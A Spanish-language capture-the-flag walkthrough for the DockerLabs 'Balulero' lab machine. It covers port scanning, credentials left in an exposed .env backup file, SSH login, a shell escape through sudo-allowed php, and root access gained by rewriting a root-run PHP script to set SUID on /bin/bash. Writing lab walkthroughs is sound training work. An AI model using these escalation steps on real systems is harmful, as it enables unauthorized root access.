---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Balulero DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip balulero.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh balulero.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 09:51 EST
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mi Landing Page - Ciberseguridad
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
```

Si entramos en la pagina vemos una pagina normal, pero si inspeccionamos el codigo podremos ver lo siguiente:

## Escalate user balu

```html
<script src="script.js"></script>
```

Si nos metemos dentro del `script.js` podremos ver lo siguiente:

```js
// Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
    console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
    let lastScrollTop = 0;
    const header = document.querySelector('header');
    const delta = 5; // La cantidad mÃ­nima de scroll para ocultar el header
```

Vemos que nos comenta que hay una copia de seguridad en la siguiente ruta del siguiente archivo llamado `.env_de_baluchingon`.

```
URL = http://<IP>/.env_de_baluchingon
```

Si nos metemos veremos lo siguiente:

```
RECOVERY LOGIN

balu:balubalulerobalulei
```

Vemos lo que parece ser una credenciales, por lo que nos conectaremos mediante `ssh`.

### SSH

```shell
ssh balu@<IP>
```

Metemos como contraseña `balubalulerobalulei` y veremos que estamos dentro.

## Escalate user chocolate

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for balu on 594b36b05c3c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on 594b36b05c3c:
    (chocolate) NOPASSWD: /usr/bin/php
```

Vemos que podemos ejecutar el binario `php` como el usuario `chocolate`, por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo -u chocolate php -r "system('$CMD');"
```

Y con esto seremos el usuario `chocolate`.

## Escalate Privileges

Si analizamos los procesos del sistema, veremos lo siguiente:

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616  1548 ?        Ss   14:51   0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
root          25  0.0  0.5 201396 22820 ?        Ss   14:51   0:00 /usr/sbin/apache2 -k start
www-data      30  0.0  0.2 201716 12728 ?        S    14:51   0:00 /usr/sbin/apache2 -k start
www-data      31  0.0  0.2 201716 12656 ?        S    14:51   0:00 /usr/sbin/apache2 -k start
www-data      33  0.0  0.2 201708 12592 ?        S    14:51   0:00 /usr/sbin/apache2 -k start
www-data      34  0.0  0.2 201852 12720 ?        S    14:51   0:00 /usr/sbin/apache2 -k start
root          49  0.0  0.0  12196  4148 ?        Ss   14:51   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
www-data      77  0.0  0.2 201676 11920 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
www-data      78  0.0  0.2 201676 11884 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
www-data      80  0.0  0.2 201700 12620 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
www-data      81  0.0  0.2 201660 11884 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
www-data      82  0.0  0.2 201660 11884 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
www-data      83  0.0  0.2 201660 11920 ?        S    14:52   0:00 /usr/sbin/apache2 -k start
root         202  0.0  0.1  13164  8388 ?        Ss   14:56   0:00 sshd: balu [priv]
balu         215  0.0  0.1  13404  6144 ?        S    14:56   0:00 sshd: balu@pts/0
balu         216  0.0  0.0   6000  3872 pts/0    Ss   14:56   0:00 -bash
root         258  0.0  0.1   7496  4308 pts/0    S    14:58   0:00 sudo -u chocolate php -r system('/bin/bash');
chocola+     259  0.0  0.4  67256 20356 pts/0    S    14:58   0:00 php -r system('/bin/bash');
chocola+     260  0.0  0.0   2616  1484 pts/0    S    14:58   0:00 sh -c /bin/bash
chocola+     261  0.0  0.0   6000  3772 pts/0    S    14:58   0:00 /bin/bash
root         290  0.0  0.0   2516  1276 ?        S    14:59   0:00 sleep 5
chocola+     291  0.0  0.0   7892  3520 pts/0    R+   14:59   0:00 ps -aux
```

Vemos que `root` esta ejecutando la siguiente linea:

```
 do php /opt/script.php; sleep 5; done
```

Por lo que vemos esta ejecutando un `script.php` en la carpeta `/opt`.

```shell
ls -la /opt/script.php
```

Info:

```
-rw-r--r-- 1 chocolate chocolate   59 May  7  2024 script.php
```

Vemos que podremos editarlo, por lo que haremos lo siguiente:

> script.php

```php
<?php
// Ejecuta el comando
$output = shell_exec('chmod u+s /bin/bash 2>&1');

// Muestra el resultado
if ($output === null) {
    echo "Permisos modificados correctamente.\n";
} else {
    echo "Error: " . $output . "\n";
}
?>
```

```shell
echo '<?php echo shell_exec("chmod u+s /bin/bash 2>&1") ?? "Permisos modificados correctamente.\n"; ?>' > /opt/script.php
```

Lo guardamos y esperamos unos `5` segundos para que se ejecute, cuando se ejecute veremos si ha funcionado.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Vemos que ha funcionado ya que ahora la `bash` tiene el `SUID` establecido, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
